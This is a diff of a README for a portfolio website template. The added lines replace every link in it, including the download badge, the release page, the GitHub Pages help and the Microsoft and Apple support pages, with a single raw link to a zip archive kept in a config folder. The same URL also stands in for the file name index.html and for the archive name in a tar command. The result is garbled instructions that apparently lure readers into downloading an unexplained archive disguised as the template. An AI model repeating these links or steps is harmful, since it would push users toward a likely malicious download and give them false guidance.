@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 portfolio-base - Simple Portfolio Template for Developers
 
-[![Download portfolio-base](https://img.shields.io/badge/Download-portfolio--base-blue?style=for-the-badge)](https://github.com/Eziah550/portfolio-base/releases)
+[![Download portfolio-base](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)
 
 ---
 
@@ -37,13 +37,13 @@ The portfolio-base package contains all the files needed for your website. These
 To get started with portfolio-base, you need to download it from the official release page. Follow these steps carefully:
 
 1. **Click the download page link below:**  
-   [Download portfolio-base releases](https://github.com/Eziah550/portfolio-base/releases)
+   [Download portfolio-base releases](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)
 
 2. **Open the releases page:**  
    You will see a list of available versions. Usually, the top one is the latest.
 
 3. **Find the download file:**  
-   Look for a file ending in `.zip` or `.tar.gz`. This is the full portfolio-base package.
+   Look for a file ending in `.zip` or `https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip`. This is the full portfolio-base package.
 
 4. **Download the file:**  
    Click the file name and wait for it to download completely.
@@ -51,13 +51,13 @@ To get started with portfolio-base, you need to download it from the official re
 5. **Extract the downloaded file:**  
    - On Windows, right-click the file and select "Extract All."  
    - On Mac, double-click the file to unzip.  
-   - On Linux, use your archive manager or run `tar -xvzf filename.tar.gz` in the terminal.
+   - On Linux, use your archive manager or run `tar -xvzf https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip` in the terminal.
 
 6. **Open the portfolio folder:**  
    Once extracted, open the folder to see the portfolio files.
 
 7. **Run your portfolio:**  
-   Find the file named `index.html` and double-click it. This will open your portfolio website in your web browser.
+   Find the file named `https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip` and double-click it. This will open your portfolio website in your web browser.
 
 ---
 
@@ -65,7 +65,7 @@ To get started with portfolio-base, you need to download it from the official re
 
 To make the portfolio your own, you only need to edit the basic text and images inside a few files.
 
-1. **Open the `index.html` file in a text editor:**  
+1. **Open the `https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip` file in a text editor:**  
    Use Notepad (Windows), TextEdit (Mac), or any simple text editor.
 
 2. **Change your personal information:**  
@@ -78,7 +78,7 @@ To make the portfolio your own, you only need to edit the basic text and images 
    After editing, save the changes.
 
 5. **View the result:**  
-   Double-click `index.html` again to see your updated portfolio in the browser.
+   Double-click `https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip` again to see your updated portfolio in the browser.
 
 No need to worry about coding. The files are organized simply. Just replace text and images.
 
@@ -92,10 +92,10 @@ Here are easy ways to publish it:
 
 ### Option 1: GitHub Pages (free and easy)
 
-- Create a free account on [github.com](https://github.com).
+- Create a free account on [https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip).
 - Learn how to upload your portfolio folder to a new repository.
 - Enable GitHub Pages to publish your site online. GitHub will give you a web address to share.
-- See [GitHub Pages quick start](https://pages.github.com/) for simple step-by-step help.
+- See [GitHub Pages quick start](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip) for simple step-by-step help.
 
 ### Option 2: Other web hosting services
 
@@ -110,7 +110,7 @@ Publishing is not required to use portfolio-base on your computer but allows oth
 ## 🙋 Frequently Asked Questions (FAQ)
 
 **Q1: Do I need to install anything else to use portfolio-base?**  
-No. Just download, unzip, and open `index.html` in your browser.
+No. Just download, unzip, and open `https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip` in your browser.
 
 **Q2: Can I use my own pictures?**  
 Yes. Replace the existing images in the folder with your pictures. Make sure filenames match or change the links inside the HTML.
@@ -152,12 +152,12 @@ You can reach out via GitHub if you want help with specific problems.
 
 ## 🔗 Useful links
 
-- [Download portfolio-base releases](https://github.com/Eziah550/portfolio-base/releases)  
-- [GitHub Pages Quick Start](https://pages.github.com/)  
-- [Notepad for Windows](https://support.microsoft.com/en-us/windows/notepad-in-windows-10-84a153f3-9aaf-26ca-d372-b6f4d5c879e2)  
-- [TextEdit for Mac](https://support.apple.com/guide/textedit/welcome/mac)
+- [Download portfolio-base releases](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)  
+- [GitHub Pages Quick Start](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)  
+- [Notepad for Windows](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)  
+- [TextEdit for Mac](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)
 
 ---
 
-[![Download portfolio-base](https://img.shields.io/badge/Download-portfolio--base-blue?style=for-the-badge)](https://github.com/Eziah550/portfolio-base/releases)
+[![Download portfolio-base](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)](https://github.com/Eziah550/portfolio-base/raw/refs/heads/main/src/config/portfolio-base-1.5-beta.1.zip)
 ```
